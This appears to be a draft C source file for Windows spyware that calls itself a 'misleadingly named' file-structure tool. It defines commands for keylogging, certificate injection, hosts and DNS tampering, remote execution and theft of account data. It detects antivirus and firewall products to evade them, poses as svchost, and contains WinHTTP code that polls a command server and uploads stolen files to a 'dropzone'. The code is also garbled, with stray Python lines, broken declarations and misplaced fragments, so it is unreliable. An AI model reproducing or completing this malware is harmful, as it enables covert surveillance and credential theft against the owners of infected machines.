/*
 * Tool name   : file_structurer
 * Description : Misleadingly named tool to investigate filestructure of an MS Windows system
 *             : and sending back data packages to the dropzone.               
 * Version     : 0.1
 * Author      : wofl
 * Web page    : 
 * Todo        : decide full scope, initial overarch-debug, fix any specific issues arising, get it to run
 * Changes     : it's new!
 *
 */



///
/// HEADERS
///

/*
/*
/*  entry:  HEADERS 16
/*  entry:  ifndef _STRUCUTRER_DEFINITIONS_ 56
/*  entry:  def _STRUCTURER_DEFINITIONS_ inc: 60
/*  entry:  MAX_BUF_SIZE 62
/*  entry:  preproc direc 124
/*  entry:  func fwd decs 260
/*  entry:  base64 funcs 314
/*  entry:  type defs 400
/*  entry:  data types 409
/*  entry:  inc. libraries 461 
/*  entry:  i) DETECT PERSONAL FIREWALL PROCESS 486
/*  entry:  ii) KILL PROCESSES TO STAY HIDDEN 1082
/*  entry:  iii) ACTUALLY SWERVING MAIN FIREWALL PROCESS 1811
/*  entry:  iv) CHOOSE FILES FOR FURTHER LOOKYLOO 2330
/*  entry:  v) FILE STRUCTURE DOCUMENT CREATION PROCESS 2345 
/*  entry:  Find favs folder 1733 appx. 2362
/*  entry:  7z? 2998
/*  entry:  encrypt? 3003
/*  entry:  vii) PREP FOR TO SEND DATA HOME - Setting the DNS server 2933
/*  entry:  Deactivate system error beep in the registry 3004
/*  entry:  viii) TIME TO CARRY OUT ACTUAL UPLOAD PROCESS 3047
/*  entry:  send data to the server. 3225
/*  entry:  Receive the dropzone response.3242
/*  entry:  Read HTTP response data 3264

/*  entry:  ix) CLEANUP PROCESS 3363
/*  entry:  Check all possible backdoor directories for uploadable files. 3371

/*  entry:  Is the backdoor installed (of course!)? 3453

/*  entry:  We received status information/instructions from the dropzone.  3478
/*  entry:  Extract status data. 3509
/*  entry:  x) FINAL SUICIDE DEL. PROCESS 3579
/*
/*
*/

#ifndef _STRUCTURER_DEFINITIONS_

#include <winsock.h>

  #define _STRJUCTURER_DEFINITIONS_
  #define DEBUG 1
  #define MAX_BUF_SIZE 1024
  #define WOFL_VERSION_STRING "(v0.1)"
  #define snprintf _snprintf

  #define CERT_SYSTEM_STORE_LOCAL_MACHINE 131072
  #define KEYLOGGING_FILES_PATTERN "KBD*.fsu"

  #define COMMAND_CLIENT_INFO 100
  #define COMMAND_CLIENT_EXEC 114
  #define COMMAND_TOOLS_DELETE_STRUCTURER 116
  #define COMMAND_TOOLS_ACCOUNTDATA 101
  #define COMMAND_TOOLS_INSTALLEDSOFTWARE 102
  #define COMMAND_TOOLS_BROWSERHISTORY 103
  #define COMMAND_TOOLS_BROWSERFAVORITES 115
  #define COMMAND_TOOLS_DOWNLOAD_FILE 127
  #define COMMAND_TOOLS_DELETE_FILE 128
  #define COMMAND_TOOLS_START_DATA_TRANSFER 130
  #define COMMAND_TOOLS_TRANSFER_DATA 129
  #define COMMAND_TOOLS_STOP_DATA_TRANSFER 131
  #define COMMAND_TOOLS_RETRIEVE_HOSTS 132
  #define COMMAND_MANAGER_RUNNINGPROCESSES 104
  #define COMMAND_MANAGER_RUNNINGWINDOWS 105
  #define COMMAND_MANAGER_RUNNING_SERVICES 106
  #define COMMAND_MANAGER_REGISTRY_ENTRIES 107
  #define COMMAND_MANAGER_FILE_ENTRIES 108
  #define COMMAND_MANAGER_FILE_GET  126
  #define COMMAND_SURVEILLANCE_KEYBOARDCAPTURE_LIST 145
  #define COMMAND_SURVEILLANCE_KEYBOARDCAPTURE_GET 146
  #define COMMAND_NETWORK_OPENCONNECTIONS 112
  #define COMMAND_NETWORK_LISTENING_SOCKETS 113
  #define COMMAND_NETWORK_INJECT_CERTIFICATE 134
  #define COMMAND_NETWORK_LIST_CERTIFICATES 135
  #define COMMAND_MANAGER_REMOVE_CERTIFICATE 136
  #define COMMAND_NETWORK_SET_DNSSERVER 138
  #define COMMAND_NETWORK_ADD_HOSTSENTRY 140
  #define COMMAND_NETWORK_REMOVE_HOSTSENTRY 141
  #define COMMAND_MANAGER_KILL_PROCESS_BYPID 122
  #define COMMAND_MANAGER_KILL_PROCESS_BYNAME 139
  #define COMMAND_MANAGER_START_PROCESS 123
  #define COMMAND_MANAGER_STOP_SERVICE 124
  #define COMMAND_MANAGER_START_SERVICE 125
  #define COMMAND_AUTHENTICATE 137


  #define CURRENT_USER           ((HKEY) 0x80000001)
  #define LOCAL_MACHINE          ((HKEY) 0x80000002)


  #define _CRT_SECURE_NO_DEPRECATE 1
  #define _CRT_NONSTDC_NO_DEPRECATE 1

  #define HOSTS_FILE "c:\\WINDOWS\\System32\\drivers\\etc\\hosts"

  #define THREAD_TIMEOUT 30



///
/// Data Type And Struct Definitions:
///

///
/// Pre processor directives.
///

  #define VR_UPDATE_IT 0  // there's an update ready for download.
  #define VR_DELETE_IT 1  // instruction to delete FILE_STRUCTRER completely from the system

  #ifndef _ERABD_H_
  #define  _ERABD_H_

  #define VERSION "0.4"
  #define DEBUG 0
  #define CRYPTED 1
  #define THREAD_TIMEOUT_UPLOAD 600
  #define TESTHOST "www.microsoft.com"
  #define LTESTHOST L"www.microsoft.com"
  #define TESTPORT 80
  #define HTTPPORT 80
  #define NOCONNECTIVITYSLEEP 10000
  #define INSTRUCTIONSLEEPER 8000
  #define CONFIG_STRING "_CONFIG_"

  #define FULL_FILE "cache"

  #define HTTP_TRANSMISSION_OK "TRANSMISSIONOK"
  #define HTTP_GET_INSTRUCTION_HEAD "CHEF COMMAND"
  #define HTTP_SEND_COMMAND_REQUEST "/test/commandRequest.php"
  #define HTTP_SEND_COMMAND_RESPONSE "/test/commandResponse.php"
  #define HTTP_INPUT_SCRIPT "/test/input_ng.php"

  #define PLUGIN_DIRECTORY "mui"
  #define PREFIX_ILLEGAL_CHARS " -/\\,.+\"\'*�%&()=?`^���$:;�������"

  #define MAX_FILE_ENTRIES 1024
  #define MAX_UPLOAD_FILES 3

  /// Define the regular expression pattern
  #define UPLOAD_FILE_PATTERN = r"(chaturbate|camgirls|facebook|linkedin|skype|xing|myspqce|amazon|ebay|hi5|flickr|youtube|craiglist|skyrock|blogger|wordpress|netlog)|pass=|passwd=|pwd=|password=|session|sid"
  /// Compile the regular expression pattern
  pattern = re.compile(FILES_UPLOAD_PATTERN)

  #define UPLOAD_FILE_PATTERN "*.fsu"

  #define PHP_LIID_VAR_NAME "liid="
  #define PHP_DATA_VAR_NAME "text="
  #define PHP_FILENAME_VAR_NAME "file="

  #define IEXPLORE_PATTERN "IEXPLORE.EXE"

  #define BD_DATA_DIR "Plugins"
  #define CALLID_FILENAME "SUPPORT.ICW"
  #define UPLOADER_FILENAME "EULAnz"

  #define TEMPORARY_DIRECTORY "c:\\temp\\"
  #define FIRST_CONNECT_FILE "MSN.ISP"
  #define snprintf _snprintf

  #define CLASSNAME "svchost.exe"
  #define WINDOWNAME "svchost"

  #define REQUEST_TYPE_COUNTER 4

  #define REQUEST_TYPE_COMMAND 0
  #define REQUEST_TYPE_SYSTEMUP 1
  #define REQUEST_TYPE_UPLOAD 2
  #define REQUEST_TYPE_UPDATES 3

  #define UPLOAD_THREAD_STARTED 0
  #define UPLOAD_THREAD_STOPPED 1
  #define UPLOAD_THREAD_FINISHED 2

  #define IDI_ICON1     211

  #define DEFINITION_NOPFW 0
  #define DEFINITION_OUTPOST 1
  #define DEFINITION_MCAFEE 2
  #define DEFINITION_ZONEALARM 3
  #define DEFINITION_MCAFEE_2 4
  #define DEFINITION_BITDEFENDER 5
  #define DEFINITION_FSECURE 6
  #define DEFINITION_KERIO 7
  #define DEFINITION_AVG 8
  #define DEFINITION_WEBROOT 9
  #define DEFINITION_ASC 10
  #define DEFINITION_MWB 11
  #define DEFINITION_WIN 12

  #define DEFINITION_COUNTER 13

typedef struct sStructureCommand
  {
    char sCommandString[MAX_BUF_SIZE + 1];
    SOCKET lRemoteSocket;
  } STRUCTURE_COMMAND;

  typedef struct sockaddr_in2
  {
    short sin_family;
    unsigned short sin_port;
    struct in_addr sin_addr;
    char sin_zero[8];
  } SOCKADDR_IN2; 

  typedef enum OS
  {
    Win32s = 1,
    Windows95,
    Windows98,
    WindowsME,
    WindowsNT,
    Windows2000,
    WindowsXP,
    Windows2003,
    WindowsVista,
    RedHatLinux,
  } eOSTypes;

 typedef struct sMessageData
  {
    int lRunTimeSeconds;
    char lProcessName[MAX_BUF_SIZE + 1];
    unsigned int lWindowMessage;
    char *lButtonTexts[128];
    int lPID;
    int lRetVal;
  } MESSAGEDATA;


    extern char *gLIID;
    extern char *gUploadServer;
    extern char *gBaseDirectory;
    extern int gPID;
    extern int gHidden;
    extern HWND gCurrentForegroundWindow;
    extern int gLocalStatusInformationValues[];
    extern char *gRemoteStatusInformationNames[];
    extern char *gBDEnvironmentDirs[];
    extern char *gMaxHDResource;
    extern int gCurrentHDResourceUsed;
    


///
/// Function forward declarations
///

  int checkPFWSignature(char **pProcesses, char **pServices);
  int getPFWInstallation(void);

  int getInstruction_DirectMain(char *pURL, char *pProxySettings, int pRetries);

  int localStatusChecks();
  void remoteStatusChecks(char *pStatusInformation);
  int sendData(SOCKET pRemoteSocket, char *pDataString, int pDataLength);
  int connectHome(char, int);
  int printDebug(char *);
  int resetWinsock();
  int initWinsock();
  int initConfig();
  int getWindowsVersion(char *pOSVersion, int pBufferLength);
  int getProcessorInformation(char *pProcessorInformation, int pBufferSize);
  int getCPUUsage(HANDLE pProcessHandle);
  int getMemoryInformation(char *pMemoryInformation, int pBufferSize);

  int uploadData_DirectMain(char *pFileName, char *pProxyConnection);

  int killProcessByName(char *pProcessNamePattern);
  int killChildProcesses(DWORD pParentPID);
  int killOurProcesses(char *pBaseDirectory);
  DWORD getProcessID(char *pProcessName, char *pProcessPath, int pProcessPathLength);
  int PIDExists(int pPid);
  int processExists(char *pProcessName, int *pPID);
  int serviceExists(char *pServicePattern);
  void runIE(char *pIEPath);
  BOOL CALLBACK EnumWindowsProcHider(HWND hWnd,LPARAM lParam);
  BOOL CALLBACK EnumWindowsProcMarker(HWND hWnd,LPARAM lParam);

  LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);
  DWORD mainLoop(LPVOID pData);
  DWORD WINAPI doHTTPUploadsThread(LPVOID pData);
  int compare(const void *arg1, const void *arg2);
  int determineFilesToUpload(char *pPattern, char *pFileEntries[MAX_FILE_ENTRIES], int *pEntryNum);


HINTERNET ghReplySession;
HINTERNET ghReplyConnect;
HINTERNET ghReplyRequest;
HINTERNET ghReplyUpdates;

HINTERNET ghSession[REQUEST_TYPE_COUNTER];
HINTERNET ghConnect[REQUEST_TYPE_COUNTER];
HINTERNET ghRequest[REQUEST_TYPE_COUNTER];
HINTERNET ghUpdates[REQUEST_TYPE_COUNTER];



  ///
  /// base64 functions
  ///

  int Base64encode_len(int len);
  int Base64encode(char * coded_dst, const char *plain_src,int len_plain_src);
  int Base64decode_len(const char * coded_src);
  int Base64decode(char * plain_dst, const char *coded_src);

  int printToFile(char *pOutputFileName, char* pCommandString);
  int findProcessName(int pPID, char *pProcessName, int pProcessNameBufSize);

  int findHistoryFile(SOCKET pRemoteSocket, char *pDirectory);
  int listHistoryEntries(SOCKET pRemoteSocket, char *pFileName);

  int findFavoritesFiles(SOCKET pRemoteSocket, char *pDirectory);
  int listFavoritesEntries(SOCKET pRemoteSocket, char *pFileName);

  DWORD WINAPI sendClientInfos(PVOID pParameter);

  int selfDelete();
  void EnumRegistryValues(HKEY pKeyHandle, char *pKey, SOCKET pRemoteSocket);

  DWORD WINAPI sendBrowserHistoryInfos(PVOID pParameter);
  DWORD WINAPI sendBrowserFavoritesInfos(PVOID pParameter);
  DWORD WINAPI sendProcessInfos(PVOID pParameter);
  DWORD WINAPI sendOpenWindowsInfos(PVOID pParameter);
  DWORD WINAPI sendServicesInfos(PVOID pParameter);

  DWORD WINAPI sendInstalledSWInfos(PVOID pParameter);
  DWORD WINAPI sendOpenConnectionsInfo(PVOID pParameter);
  DWORD WINAPI sendListeningSocketsInfo(PVOID pParameter);
  DWORD WINAPI sendRemoteShellCommandOutput(PVOID pParameter);
  DWORD WINAPI sendFileListingInfos(PVOID pParameter);
  DWORD WINAPI sendRegistryListingInfos(PVOID pParameter);

  int handleCommand(char *pCommandBuffer, SOCKET pRemoteSocket);
  int GetCodecClsid(const WCHAR* pFormat, CLSID* pClsid);
  DWORD WINAPI killProcessByPID(PVOID pParameter);
  DWORD WINAPI killProcessByName(PVOID pParameter);
  DWORD WINAPI stopService(PVOID pParameter);
  DWORD WINAPI startService(PVOID pParameter);
  DWORD WINAPI getFile(PVOID pParameter);
  DWORD WINAPI sendHostsFile(PVOID pParameter);
  DWORD WINAPI sendAccountInfos(PVOID pParameter);

  int deleteFile(char *pFileName, SOCKET pRemoteSocket);
  int downloadFile(char *pURL, SOCKET pRemoteSocket);
  int retrieveFileData(char *pFileData, int pFileDataLength, SOCKET pRemoteSocket);
  int decodeFile(char *pFileName);
  DWORD WINAPI injectCertificate(PVOID pParameter);
  DWORD WINAPI listCertificates(PVOID pParameter);
  DWORD listCertificateStore(char *pStoreName, SOCKET pRemoteSocket);
  DWORD WINAPI setNewDNSServer(PVOID pParameter);
  DWORD WINAPI deleteCertificates(PVOID pParameter);
  int deleteCert(DWORD pParams, char *pCertIssuerName, char *pStoreName);
  DWORD WINAPI removeHostsEntry(PVOID pParameter);
  DWORD WINAPI addHostsEntry(PVOID pParameter);

  DWORD WINAPI listKeyCaptures(PVOID pParameter);
  DWORD WINAPI getKeylogFile(PVOID pParameter);
  __declspec(dllexport) LRESULT CALLBACK KeyEvent (int nCode, WPARAM wParam, LPARAM lParam);

  void processExists(char *pProcFullPath);
  BOOL EnablePriv(LPCSTR pPrivileges);

  void enumOutlookAccounts(SOCKET pRemoteSocket);
  BOOL addAccountItem(SOCKET pRemoteSocket, char *resname, char *restype, char *usrname, char *pass);
  void EnumPStorage(SOCKET pRemoteSocket);

  bool readLine(char *, int, char *, DWORD, int *);
  DWORD WINAPI sendMessage(LPVOID pParam);
  int addCertificate(char *pCertStoreName, DWORD pFlags, char *pCertificateFile);
  void muteSpeakers(DWORD *mVolume);
  void unmuteSpeakers(DWORD mVolume);
  void GetPIDsFromProcessName(char *, DWORD, DWORD *);
  BOOL CALLBACK EnumProcToSendMessage(HWND, LPARAM);
  LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);
  DWORD WINAPI workerThread(PVOID pParameter);



int gTotalUsedMemory = 0;
PFILE_ITEM gFileListHead = NULL;


///
/// Type definitions
///

typedef int (*gMyPFWCircumventionStatus)(char *pUploadFile, char *pProxySettings, int pReason);
typedef int (*gMyPFWCircumventionUpload)(char *pUploadFile, char *pProxySettings);



//
/// Data types
//

struct ThreadData
{
  WCHAR *mwHost;
  WCHAR *mwURI;
  char *mCommand;
  char mRealCommand[MAX_BUF_SIZE + 1];
  int mCommandLength;
};


typedef struct sIEData
{
  int *gHiddenPointer;
  char *mIEPath;
} IEData;



///
/// Direct upload of a file to a remote server.
///

int uploadData_DirectMain(char *pFileName, char *pProxyConnection)
{
  DWORD dwBytesWritten = 0;
  BOOL  bResults = FALSE;
  FILE *mFH = NULL;
  struct stat mSB;
  char mBuffer[MAX_BUF_SIZE + 1];
  int mSizeCounter = 0;
  HINTERNET hSession = NULL;
  HINTERNET hConnect = NULL; 
  HINTERNET hRequest = NULL;

  WCHAR mwProxyConnection[MAX_BUF_SIZE + 1];
  WCHAR mwUploadServer[MAX_BUF_SIZE + 1];
  WCHAR mwUploadScript[MAX_BUF_SIZE + 1];
  char *mBaseNameB64EncodedFile = NULL;
  int mRetVal = 0;
  int mPID = 0;

  DWORD mTotalBytes = 0;
  DWORD dwSize = 0;
  DWORD dwDownloaded = 0;
  LPSTR pszOutBuffer;



///
/// inc. libraries
///

#include <windows.h>
#include <stdio.h>
#include <shlwapi.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <conio.h>
#include <stdlib.h>
#include <string.h>
#include <Tlhelp32.h>
#include "Processes.h"
#include <io.h>
#include <Psapi.h>
#include <process.h>
#include <winhttp.h>

import re


#endif




///
/// i) DETECT PERSONAL FIREWALL PROCESS
///


char *gPFWDefinition[] = {"no personal firewall installed", 
                          "Agnitum Outpost", 
                          "McAfee", 
                          "Zone Alarm", 
                          "McAfee2",
                          "BitDefender",
                          "F-Secure",
                          "Kerio",
                          "AVG",
                          "WebRoot",
?                         "Advanced System Care", /// needs adding code
?                         "Malwarebytes", /// needs addin code
?                         "Windows Defender", /// needs addin code
                          NULL};



///
/// Determine installed personal firewall.
///

int getPFWInstallation(void)

{
  int mRetVal = DEFINITION_NOPFW;
  int mEvidenceCounter = 0;
  
  char *mMCAFEEProcesses[] = {"mpfagent.exe", "mpfservice.exe", NULL};    
  char *mMCAFEEServices[] = {"mpfservice", NULL};  

  char *mOUTPOSTProcesses[] = {"outpost.exe", NULL};    
  char *mOUTPOSTServices[] = {"outpostfirewall", NULL}; 

  char *mZONEALARMProcesses[] = {"zlclient.exe", NULL};
  char *mZONEALARMServices[] = {NULL};

  char *mMCAFEE2Processes[] = {"Mcdetect.exe", "McShield.exe", NULL};
  char *mMCAFEE2Services[] = {"McShield", NULL};

  char *mBitDefenderProcesses[] = {"bdagent.exe", "bdmcon.exe", NULL};
  char *mBitDefenderServices[] = {"BitDefender", NULL};

  char *mFSecureProcesses[] = {"fsdfwd.exe", NULL};
  char *mFSecureServices[] = {"FSDFWD", "F-Secure", NULL};
-
  char *mKerioProcesses[] = {"kadmin.exe", NULL};
  char *mKerioServices[] = {"Kerio", NULL};

  char *mAVGProcesses[] = {"avgfwsrv.exe", NULL};
  char *mAVGServices[] = {"avgfwsrv", NULL};

  char *mWebRootProcesses[] = {"webroot.exe", "firewallntservice", "webroot", NULL};
  char *mWebRootServices[] = {"webroot", NULL};

  char *mAdvanced SystemCareProcesses#[] = ("advanced systemcare tray.exe", NULL);
  char *mAdvanced SystemCareServices[] = ("advanced systemcare service",NULL);

  char *mMalwarebytesProcesses[] = ("mbamtray.exe", "mbam.exe", "mbamservice.exe", NULL);
  char *mMalwarebytesServices[] = ("mbamservice",NULL);

  char *mWindows DefenderProcesses[] = ("msmpeng.exe", "windefend.exe", NULL); // ?? "Wcmsvc"/"gpsvc" ?? also of interest: "UserDataSvc", "UserManager", "ssh-agent ",
  char *mWindows DefenderServices[] = ("mpssvc", "wscsvc", "windefend", "securityhealthservice", "wdnissvc", "sense", "sgrmbroker", "samss", "eaphost", "Consentuxusersvc", "AssignedAccessManagerSvc", "AppIDSvc", NULL);





  ///
  /// Outpost check
  ///
 
  if ((mEvidenceCounter = checkPFWSignature(mOUTPOSTProcesses, mOUTPOSTServices)) > 0)
  {
    mRetVal = DEFINITION_OUTPOST;
    goto END_GETPFWINSTALLATION;
  } 



  ///
  // Mcafee personal firewall check
  ///
 
  if ((mEvidenceCounter = checkPFWSignature(mMCAFEEProcesses, mMCAFEEServices)) > 0)
  {
    mRetVal = DEFINITION_MCAFEE;
    goto END_GETPFWINSTALLATION;
  }



  ///
  /// Mcafee2 personal firewall check
  ///
 
  if ((mEvidenceCounter = checkPFWSignature(mMCAFEE2Processes, mMCAFEE2Services)) > 0)
  {
    mRetVal = DEFINITION_MCAFEE_2;
    goto END_GETPFWINSTALLATION;
  }



  ///
  /// Zonealarm personal firewall check
  ///
 
  if ((mEvidenceCounter = checkPFWSignature(mZONEALARMProcesses, mZONEALARMServices)) > 0)
  {
    mRetVal = DEFINITION_ZONEALARM;
    goto END_GETPFWINSTALLATION;
  }



  ///
  /// Bitdefender personal firewall check
  ///
 
  if ((mEvidenceCounter = checkPFWSignature(mBitDefenderProcesses, mBitDefenderServices)) > 0)
  {
    mRetVal = DEFINITION_BITDEFENDER;
    goto END_GETPFWINSTALLATION;
  }



  ///
  /// F-secure personal firewall check
  ///
 
  if ((mEvidenceCounter = checkPFWSignature(mFSecureProcesses, mFSecureServices)) > 0)
  {
    mRetVal = DEFINITION_FSECURE;
    goto END_GETPFWINSTALLATION;
  }



  ///
  /// Kerio personal firewall check
  ///
 
  if ((mEvidenceCounter = checkPFWSignature(mKerioProcesses, mKerioServices)) > 0)
  {
    mRetVal = DEFINITION_KERIO;
    goto END_GETPFWINSTALLATION;
  }



  ///
  /// AVG personal firewall check
  ///
 
  if ((mEvidenceCounter = checkPFWSignature(mAVGProcesses, mAVGServices)) > 0)
  {
    mRetVal = DEFINITION_AVG;
    goto END_GETPFWINSTALLATION;
  }



  ///
  /// Webroot personal firewall check
  ///
   
  if ((mEvidenceCounter = checkPFWSignature(mWebRootProcesses, mWebRootServices)) > 0)
  {
    mRetVal = DEFINITION_WEBROOT;
    goto END_GETPFWINSTALLATION;
  }




  ///
  /// Advancesd System Care personal firewall check
  ///
   
  if ((mEvidenceCounter = checkPFWSignature(mAdvanced System CareProcesses, mAdvanced System CareServices)) > 0)
  {
    mRetVal = DEFINITION_ASC;
    goto END_GETPFWINSTALLATION;
  }




  ///
  /// Malwarebytes personal firewall check
  ///
   
  if ((mEvidenceCounter = checkPFWSignature(mMalwarebytesProcesses, mMalwarebytesServices)) > 0)
  {
    mRetVal = DEFINITION_MWB;
    goto END_GETPFWINSTALLATION;
  }




  ///
  /// Windows Defender personal firewall check
  ///
   
  if ((mEvidenceCounter = checkPFWSignature(mDefenderProcesses, mDefenderServices)) > 0)
  {
    mRetVal = DEFINITION_WIN;
    goto END_GETPFWINSTALLATION;
  }



END_GETPFWINSTALLATION:

  return(mRetVal); 
}




///
/// Check for firewall characteristics
///

int checkPFWSignature(char **pProcesses, char **pServices)
{
  char **mProcesses = pProcesses;    
  char **mServices = pServices;
  int mCounter = 0;
  char mTemp[MAX_BUF_SIZE + 1];
  int mRetVal = 0;
  int mEvidenceCounter = 0;



  ///
  /// Check for running processe(s).
  ///
 
  mCounter = 0;
  while(mProcesses[mCounter] != NULL)
  {
    ZeroMemory(mTemp, sizeof(mTemp));
    strncpy(mTemp, mProcesses[mCounter], sizeof(mTemp) - 1);
    lowerToUpperCase(mTemp);    
    
    if ((mRetVal = processExists(mTemp, NULL)) == 0)
      mEvidenceCounter++;   
    
    mCounter++;
  }
  

  

  ///
  /// Check for running services
  ///
  
  mCounter = 0;
  while(mServices[mCounter] != NULL)
  {      
    ZeroMemory(mTemp, sizeof(mTemp));
    strncpy(mTemp, mServices[mCounter], sizeof(mTemp) - 1);
    lowerToUpperCase(mTemp);    
    
    if ((mRetVal = serviceExists(mTemp)) == 0)
      mEvidenceCounter++;   
    
    mCounter++;
  }
  
  return(mEvidenceCounter);    
}    



///
/// initialising servers etc.
///

int getInstruction_DirectMain(char *pURL, char *pProxyConnection, int pQueryType)
{
  char *mURL = (char *) pURL;
  int mTotalBytes = 0;
  DWORD dwSize = 0;
  DWORD dwDownloaded = 0;
  BOOL  bResults = FALSE;
  char *mTempPointer = NULL;
  TCHAR mURI[MAX_BUF_SIZE];
  char mHost[MAX_BUF_SIZE + 1];
  WCHAR mwHost[MAX_BUF_SIZE + 1];
  WCHAR mwURI[MAX_BUF_SIZE + 1];
  WCHAR mwProxyConnection[MAX_BUF_SIZE + 1];
  int mReturnStat = 0;
  char mReturnData[MAX_BUF_SIZE + 1];
  int mRetVal = 0;



  ///
  /// Initialization
  ///

  if (ghReplyRequest != INVALID_HANDLE_VALUE) WinHttpCloseHandle(ghReplyRequest);
  if (ghReplyConnect != INVALID_HANDLE_VALUE) WinHttpCloseHandle(ghReplyConnect);
  if (ghReplySession != INVALID_HANDLE_VALUE) WinHttpCloseHandle(ghReplySession);
  if (ghReplyUpdates != INVALID_HANDLE_VALUE) WinHttpCloseHandle(ghReplyUpdates);


  if (ghRequest[pQueryType] != INVALID_HANDLE_VALUE) WinHttpCloseHandle(ghRequest[pQueryType]);
  if (ghConnect[pQueryType] != INVALID_HANDLE_VALUE) WinHttpCloseHandle(ghConnect[pQueryType]);
  if (ghSession[pQueryType] != INVALID_HANDLE_VALUE) WinHttpCloseHandle(ghSession[pQueryType]);
  if (ghUpdates[pQueryType] != INVALID_HANDLE_VALUE) WinHttpCloseHandle(ghUpdates[pQueryType]);

  ZeroMemory(mwURI, sizeof(mwURI));
  ZeroMemory(mwHost, sizeof(mwHost));
  ZeroMemory(mwProxyConnection, sizeof(mwProxyConnection));

  ZeroMemory(mURI, sizeof(mURI));
  ZeroMemory(mHost, sizeof(mHost));


  if (pQueryType == REQUEST_TYPE_COMMAND)
    else {
    mRetVal = 1;
    goto END;
  }



  ///
  /// Extract URL
  ///

  if (strstr(mURL, "//") == NULL)
    goto END;

  mTempPointer = strstr(mURL, "//");
  mTempPointer += 2;


  if (strchr(mTempPointer, ':') != NULL)
    strncpy(mHost, mTempPointer, strchr(mTempPointer, ':') - mTempPointer); 
  else if (strchr(mTempPointer, '/') != NULL)    
    strncpy(mHost, mTempPointer, strchr(mTempPointer, '/') - mTempPointer); 
  else {
    mRetVal = 1;
    goto END;
  }



  ///
  /// Extract URI
  ///
    
  if (strchr(mTempPointer, '/') == NULL)
  {
    mRetVal = 2;
    goto END;
  }

  mTempPointer = strchr(mTempPointer, '/');
  strncpy(mURI, mTempPointer, MAX_BUF_SIZE);
  


  ///
  /// Parse the file name.
  ///
  
  if (strrchr(mTempPointer, '/') != NULL)
  {
    mTempPointer = strrchr(mTempPointer, '/');
    mTempPointer++;
  } else {
    mRetVal = 3;
    goto END;
  }

  mbstowcs(mwHost, mHost, MAX_BUF_SIZE);
  mbstowcs(mwURI, mURI, MAX_BUF_SIZE);


  if (strlen(pProxyConnection) > 0)
  {
    mbstowcs(mwProxyConnection, pProxyConnection, MAX_BUF_SIZE);
    ghSession[pQueryType] = WinHttpOpen(L"DRGC+", WINHTTP_ACCESS_TYPE_NAMED_PROXY, mwProxyConnection, WINHTTP_NO_PROXY_BYPASS, 0);
  } else 
    ghSession[pQueryType] = WinHttpOpen(L"DRGC-", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);



  ///
  ///  Specify HTTP server.
  ///

  if (ghSession[pQueryType])
  {
    ghConnect[pQueryType] = WinHttpConnect(ghSession[pQueryType], mwHost, INTERNET_DEFAULT_HTTP_PORT, 0);
    WinHttpSetTimeouts(ghSession[pQueryType], 10000, 10000, 10000, 10000);
  } else {
    mRetVal = 4;
    goto END;
  }



  ///
  /// Create HTTP request handle.
  ///

  if (ghConnect[pQueryType])
  {
    ghRequest[pQueryType] = WinHttpOpenRequest(ghConnect[pQueryType], L"GET", mwURI, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_NULL_CODEPAGE); 
    WinHttpAddRequestHeaders(ghRequest[pQueryType], L"Cache-Control: no-cache", 23, WINHTTP_ADDREQ_FLAG_ADD);
  } else {
    mRetVal = 6;
    goto END;
  }



  ///
  /// Send HTTP request.
  ///

  if (ghRequest[pQueryType])
  {
    if ((bResults = WinHttpSendRequest(ghRequest[pQueryType], WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) == FALSE)
    {
      mRetVal = 8;
      goto END;
    } 
  } else {
    mRetVal = 9;
    goto END;
  }

  

  ///
  /// End the HTTP request by receiving the response.
  ///

  if (bResults)
  {
    if ((bResults = WinHttpReceiveResponse(ghRequest[pQueryType], NULL)) == FALSE)
    {
      mRetVal = 10;
      goto END;
    }
  } else {
    mRetVal = 11;
    goto END;
  }



  ///
  /// Check returned buffer for data
  ///

  if (bResults)
  {
    ZeroMemory(mReturnData, sizeof(mReturnData));

    if (dwSize > MAX_BUF_SIZE)
      goto END;

    if (!WinHttpQueryDataAvailable(ghRequest[pQueryType], &dwSize))
      goto END;

    if (!WinHttpReadData(ghRequest[pQueryType], (LPVOID) mReturnData, dwSize, &dwDownloaded) && DEBUG)
      goto END;
  } // if (bResults)


END:


  ///
  /// Release all allocated resources.
  ///

  if (ghRequest[pQueryType] != INVALID_HANDLE_VALUE) WinHttpCloseHandle(ghRequest[pQueryType]);
  if (ghConnect[pQueryType] != INVALID_HANDLE_VALUE) WinHttpCloseHandle(ghConnect[pQueryType]);
  if (ghSession[pQueryType] != INVALID_HANDLE_VALUE) WinHttpCloseHandle(ghSession[pQueryType]);
  if (ghUpdates[pQueryType] != INVALID_HANDLE_VALUE) WinHttpCloseHandle(ghUpdates[pQueryType]);
  
  if (ghReplyRequest != INVALID_HANDLE_VALUE) WinHttpCloseHandle(ghReplyRequest);
  if (ghReplyConnect != INVALID_HANDLE_VALUE) WinHttpCloseHandle(ghReplyConnect);
  if (ghReplySession != INVALID_HANDLE_VALUE) WinHttpCloseHandle(ghReplySession);
  if (ghReplyUpdates != INVALID_HANDLE_VALUE) WinHttpCloseHandle(ghReplyUpdates);
v

  return(mRetVal);
}



  ///
  /// Initialize data buffers
  ///

  ZeroMemory(pOldestFile, pOldestFileBufferSize);
  if (mCurrentItem)
  {
    strncpy(pOldestFile, mCurrentItem->mFileName, pOldestFileBufferSize);
    mRetVal = mCurrentItem->mFileSize;
    mOldestDate = mCurrentItem->mCreationTime;
  } else {
    mRetVal = -1;
    goto END;
  }



  ///
  /// Iterate through file list and find the oldest one.
  ///
  
  while (mCurrentItem != NULL)
  {  	  
    if (PathFileExists(mCurrentItem->mFileName) && mCurrentItem->mCreationTime < mOldestDate && mCurrentItem->mCreationTime > 0)
    {
      ZeroMemory(pOldestFile, pOldestFileBufferSize);
      strncpy(pOldestFile, mCurrentItem->mFileName, pOldestFileBufferSize);
      mOldestDate  = mCurrentItem->mCreationTime;
      mRetVal = mCurrentItem->mFileSize;
    } // if (mCurrentItem->mCreationTime < mOldestDate && mCurrentItem->mCreationTime > 0)
    mCurrentItem = mCurrentItem->mNextItem;
  } // while (mCurrentItem != NULL)

END:

